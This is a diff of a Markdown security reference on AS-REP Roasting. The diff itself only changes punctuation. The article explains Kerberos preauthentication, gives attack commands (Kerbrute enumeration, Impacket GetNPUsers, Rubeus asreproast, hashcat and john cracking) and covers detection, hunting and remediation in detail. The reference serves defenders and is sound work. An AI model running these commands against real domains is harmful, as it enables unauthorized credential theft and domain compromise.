@@ -1,6 +1,6 @@
 ---
 title: "AS-REP Roasting"
-description: "Complete AS-REP Roasting reference: Kerberos preauthentication internals, unauthenticated attack execution, honeypot accounts, detection logic, and prevention — with every step explained."
+description: "Complete AS-REP Roasting reference: Kerberos preauthentication internals, unauthenticated attack execution, honeypot accounts, detection logic, and prevention, with every step explained."
 date: 2026-06-12T09:15:00
 category: active-directory
 tags:
@@ -17,19 +17,19 @@ featured: false
 
 ## Definition
 
-AS-REP Roasting targets Active Directory accounts configured with the flag **"Do not require Kerberos preauthentication"** (`DONT_REQ_PREAUTH`, UAC flag `0x400000`). When set, the Kerberos Key Distribution Center (KDC) responds to authentication requests without first verifying that the requester actually knows the account's password. The response contains data encrypted with the account's credential hash — extractable and crackable offline.
+AS-REP Roasting targets Active Directory accounts configured with the flag **"Do not require Kerberos preauthentication"** (`DONT_REQ_PREAUTH`, UAC flag `0x400000`). When set, the Kerberos Key Distribution Center (KDC) responds to authentication requests without first verifying that the requester actually knows the account's password. The response contains data encrypted with the account's credential hash, extractable and crackable offline.
 
 Unlike Kerberoasting, AS-REP Roasting can be performed **entirely unauthenticated**: you do not need a valid domain session. You only need to know or guess a valid username.
 
 ---
 
-## Kerberos Preauthentication — What It Is and Why It Matters
+## Kerberos Preauthentication, What It Is and Why It Matters
 
 ### Normal Kerberos AS-REQ flow (preauthentication enabled)
 
 1. Client encrypts a timestamp with its own NT hash (PBKDF2-derived key)
 2. Client sends this in the AS-REQ to the KDC
-3. KDC decrypts the timestamp with the stored account key — if valid, the user is authenticated
+3. KDC decrypts the timestamp with the stored account key, if valid, the user is authenticated
 4. KDC returns an AS-REP with a TGT encrypted with the krbtgt key, and a session key encrypted with the user's key
 
 The encrypted timestamp proves the requester knows the password **before** the KDC responds.
@@ -41,7 +41,7 @@ The encrypted timestamp proves the requester knows the password **before** the K
 3. The AS-REP contains a session key encrypted with the account's hash
 4. An attacker who captures this response can attempt to crack the encrypted blob offline
 
-The KDC is not doing anything wrong — it is behaving exactly as designed. The vulnerability is the flag itself.
+The KDC is not doing anything wrong, it is behaving exactly as designed. The vulnerability is the flag itself.
 
 ---
 
@@ -58,7 +58,7 @@ In a modern Windows-only domain, **there is no legitimate reason for this flag t
 
 ## How an Attacker Performs This Attack
 
-### Step 1 — Username Enumeration (unauthenticated)
+### Step 1, Username Enumeration (unauthenticated)
 
 AS-REP Roasting can be preceded by username enumeration because the KDC returns different error codes depending on whether a username exists:
 
@@ -68,21 +68,21 @@ AS-REP Roasting can be preceded by username enumeration because the KDC returns 
 - Valid AS-REP returned → username exists AND `DONT_REQ_PREAUTH` is set
 
 ```bash
-# Kerbrute — enumerate valid usernames via Kerberos AS-REQ
+# Kerbrute, enumerate valid usernames via Kerberos AS-REQ
 ./kerbrute userenum -d domain.local --dc 192.168.1.10 usernames.txt
 
-# Kerbrute — combined enum + AS-REP roast
+# Kerbrute, combined enum + AS-REP roast
 ./kerbrute bruteuser -d domain.local --dc 192.168.1.10 -o valid_users.txt usernames.txt
 ```
 
-### Step 2 — AS-REP Roasting
+### Step 2, AS-REP Roasting
 
 ```bash
-# Impacket — unauthenticated, with a username list
+# Impacket, unauthenticated, with a username list
 python3 GetNPUsers.py domain.local/ -no-pass -usersfile users.txt \
   -dc-ip 192.168.1.10 -outputfile asrep_hashes.txt
 
-# Impacket — authenticated, auto-enumerate vulnerable accounts
+# Impacket, authenticated, auto-enumerate vulnerable accounts
 python3 GetNPUsers.py domain.local/lowprivuser:password \
   -dc-ip 192.168.1.10 -request -outputfile asrep_hashes.txt
 
@@ -92,17 +92,17 @@ python3 GetNPUsers.py domain.local/ -k -no-pass -dc-ip 192.168.1.10 -request
 ```
 
 ```powershell
-# Rubeus — roast all accounts with preauthentication disabled
+# Rubeus, roast all accounts with preauthentication disabled
 .\Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt
 
 # Target a specific account
 .\Rubeus.exe asreproast /user:targetuser /format:hashcat /outfile:asrep_hashes.txt
 
-# PowerView — enumerate vulnerable accounts first
+# PowerView, enumerate vulnerable accounts first
 Get-DomainUser -PreauthNotRequired | Select-Object SamAccountName, DistinguishedName
 ```
 
-### Step 3 — Offline Cracking
+### Step 3, Offline Cracking
 
 The resulting hash (Kerberos 5 AS-REP etype 23, Hashcat mode 18200):
 
@@ -128,11 +128,11 @@ john --format=krb5asrep asrep_hashes.txt --wordlist=/usr/share/wordlists/rockyou
 
 **2. No lockout, no noise.** The KDC processes these requests normally. There are no failed authentication events, no rate limiting, no lockout counter increments.
 
-**3. Blind cracking phase.** Offline cracking is invisible to the domain entirely. The attacker can take months to crack a complex password — no domain-side detection is possible during that window.
+**3. Blind cracking phase.** Offline cracking is invisible to the domain entirely. The attacker can take months to crack a complex password, no domain-side detection is possible during that window.
 
 **4. Username enumeration amplifies the attack.** Because the KDC behaves differently for valid vs. invalid usernames, an attacker can build a complete username list from a standard wordlist before ever requesting hashes.
 
-**5. Any account can be vulnerable.** There is no type restriction on `DONT_REQ_PREAUTH` — it can be set on Domain Admins, service accounts, or any user. Finding a Domain Admin with this flag is a direct path to full domain compromise.
+**5. Any account can be vulnerable.** There is no type restriction on `DONT_REQ_PREAUTH`, it can be set on Domain Admins, service accounts, or any user. Finding a Domain Admin with this flag is a direct path to full domain compromise.
 
 **6. AES still crackable, just slower.** If the attacker requests AES AS-REPs (Hashcat mode 19900 for AES256), they are harder but not impossible to crack, especially with weak passwords.
 
@@ -140,13 +140,13 @@ john --format=krb5asrep asrep_hashes.txt --wordlist=/usr/share/wordlists/rockyou
 
 ## How to Detect It
 
-### Event ID 4768 — The Primary Signal
+### Event ID 4768, The Primary Signal
 
 Event 4768 is generated on the DC when an AS-REQ is received. The key field is `PreAuthType`:
 
 | PreAuthType value | Meaning |
 |---|---|
-| `0` | No preauthentication — AS-REP Roasting |
+| `0` | No preauthentication, AS-REP Roasting |
 | `2` | Encrypted timestamp (normal) |
 | `138` | PKINIT (certificate-based, normal) |
 | `16` | Hardware token (normal) |
@@ -166,7 +166,7 @@ Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4768 } |
 ```
 
 ```powershell
-# Detect username enumeration — bursts of 4768 with ResultCode 0x6 (user not found)
+# Detect username enumeration, bursts of 4768 with ResultCode 0x6 (user not found)
 $start = (Get-Date).AddHours(-1)
 Get-WinEvent -FilterHashtable @{
   LogName = 'Security'; Id = 4768; StartTime = $start
@@ -200,7 +200,7 @@ if ($suspectIPs) {
 ### Sysmon Detection
 
 ```powershell
-# Sysmon Event 3 — Network connection to port 88 (Kerberos) from non-system processes
+# Sysmon Event 3, Network connection to port 88 (Kerberos) from non-system processes
 Get-WinEvent -FilterHashtable @{
   LogName = 'Microsoft-Windows-Sysmon/Operational'; Id = 3
 } | Where-Object {
@@ -271,7 +271,7 @@ Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4768 } |
 
 ## How to Hunt It (Post-Incident)
 
-### Phase 1 — Identify all vulnerable accounts
+### Phase 1, Identify all vulnerable accounts
 
 ```powershell
 # Full audit of DONT_REQ_PREAUTH accounts
@@ -297,7 +297,7 @@ Get-ADUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" `
   -Properties PasswordLastSet, Enabled, AdminCount
 ```
 
-### Phase 2 — Historical 4768 review
+### Phase 2, Historical 4768 review
 
 ```powershell
 $start = (Get-Date).AddDays(-30)
@@ -317,7 +317,7 @@ foreach ($dc in $dcs) {
 }
 ```
 
-### Phase 3 — Correlate with subsequent account activity
+### Phase 3, Correlate with subsequent account activity
 
 ```powershell
 # If a roasted account was later compromised, look for logon anomalies
@@ -336,7 +336,7 @@ foreach ($acct in $roastedAccounts) {
 
 ## How to Prevent It
 
-### 1. Enable preauthentication on all accounts — the definitive fix
+### 1. Enable preauthentication on all accounts, the definitive fix
 
 ```powershell
 # Remediate all accounts in one pass
@@ -354,7 +354,7 @@ Get-ADUser -Filter { DoesNotRequirePreAuth -eq $true } |
 > [!WARNING]
 > Before bulk-remediating, check with application owners whether any system explicitly depends on `DONT_REQ_PREAUTH`. Legacy SAP, Oracle EBS, and some older Java Kerberos clients (MIT Kerberos < 1.7) may require it. Coordinate a test window.
 
-### 2. Enforce AES — make cracking harder
+### 2. Enforce AES, make cracking harder
 
 ```powershell
 # Set AES-only on affected accounts
@@ -367,7 +367,7 @@ Get-ADUser -Filter { DoesNotRequirePreAuth -eq $true } |
 ### 3. Scheduled compliance audit
 
 ```powershell
-# Weekly check — run via Scheduled Task or Azure Automation
+# Weekly check, run via Scheduled Task or Azure Automation
 $vulnerable = Get-ADUser -Filter { DoesNotRequirePreAuth -eq $true } |
   Where-Object { $_.SamAccountName -ne "svc_ldapquery" }  # exclude honeypot
 
@@ -380,7 +380,7 @@ if ($vulnerable.Count -gt 0) {
 }
 ```
 
-### 4. Block at the firewall — limit Kerberos port 88 access
+### 4. Block at the firewall, limit Kerberos port 88 access
 
 Workstations should only query the DC on port 88 via LSASS. Direct access from non-domain-joined hosts to port 88 should be restricted.
 
@@ -393,4 +393,4 @@ Allow: internal subnets → DC:88 only from domain-joined hosts
 
 ## Conclusion
 
-AS-REP Roasting is uniquely dangerous because it requires no credentials at all — just a username and network access to port 88. The honeypot account is the most effective detection: configure one account with `DONT_REQ_PREAUTH`, strong password, and alert on any 4768 against it. The fix is a single attribute change: `Set-ADAccountControl -DoesNotRequirePreAuth $false`. The only reason to delay is legacy application compatibility — identify those dependencies, fix them, and close the exposure.
+AS-REP Roasting is uniquely dangerous because it requires no credentials at all, just a username and network access to port 88. The honeypot account is the most effective detection: configure one account with `DONT_REQ_PREAUTH`, strong password, and alert on any 4768 against it. The fix is a single attribute change: `Set-ADAccountControl -DoesNotRequirePreAuth $false`. The only reason to delay is legacy application compatibility, identify those dependencies, fix them, and close the exposure.
